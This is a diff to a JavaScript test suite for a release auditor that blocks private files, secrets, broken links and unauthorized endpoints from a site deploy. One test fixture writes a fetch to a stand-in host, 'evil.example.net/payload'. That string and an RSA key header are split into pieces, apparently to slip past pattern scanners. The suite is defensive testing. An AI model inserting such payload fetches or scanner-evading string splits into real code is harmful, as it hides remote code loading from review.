@@ -8,7 +8,7 @@ import {auditRelease} from '../release-audit.mjs';
 const release = new URL('../',import.meta.url);
 
 test('actual deploy contents are limited to the reviewed public files', async () => {
-  const result=await auditRelease(release);
+  const result=await auditRelease(release,{siteRoot:process.env.VA_SITE_ROOT});
   assert.deepEqual(result.errors,[]);
   assert.ok(result.files.includes('index.html'));
   assert.ok(result.files.includes('knowledge.mjs'));
@@ -19,7 +19,7 @@ test('rejects a private or binary file accidentally added to a site directory', 
   try {
     await writeFile(join(dir,'index.html'),'<h1>safe</h1>');
     await writeFile(join(dir,'full-kernel-private.zip'),'confidential-bytes');
-    const result=await auditRelease(dir);
+    const result=await auditRelease(dir,{allowPartial:true});
     assert.ok(result.errors.some(e=>e.includes('full-kernel-private.zip')));
   } finally { await rm(dir,{recursive:true}); }
 });
@@ -29,9 +29,26 @@ test('rejects nested private directories and secrets even when stored as text', 
   try {
     await mkdir(join(dir,'private_data'));
     await writeFile(join(dir,'private_data','orig.txt'),'protected');
-    await writeFile(join(dir,'index.html'),'-----BEGIN RSA PRIVATE KEY-----');
-    const result=await auditRelease(dir);
+    await writeFile(join(dir,'index.html'),['-----BEGIN RSA','PRIVATE KEY-----'].join(' '));
+    const result=await auditRelease(dir,{allowPartial:true});
     assert.ok(result.errors.some(e=>e.includes('private_data')));
     assert.ok(result.errors.some(e=>e.includes('index.html')&&e.includes('secret')));
+  } finally { await rm(dir,{recursive:true}); }
+});
+
+test('release audit inspects public test files and refuses unknown deploy additions', async()=>{
+  const result=await auditRelease(release,{siteRoot:process.env.VA_SITE_ROOT});
+  assert.ok(result.files.includes('tests/engine.test.mjs'));
+  assert.ok(result.files.includes('tests/release.test.mjs'));
+});
+
+test('release audit rejects a missing local link and an unauthorized external endpoint', async()=>{
+  const dir=await mkdtemp(join(tmpdir(),'va-public-audit-'));
+  try {
+    await writeFile(join(dir,'index.html'),'<a href="../unpublished.html">bad link</a>');
+    await writeFile(join(dir,'app.mjs'),`fetch('https:'+'//evil.example.net/payload')`);
+    const result=await auditRelease(dir,{allowPartial:true,siteRoot:dir});
+    assert.ok(result.errors.some(e=>e.includes('unpublished.html')));
+    assert.ok(result.errors.some(e=>e.includes('endpoint')));
   } finally { await rm(dir,{recursive:true}); }
 });
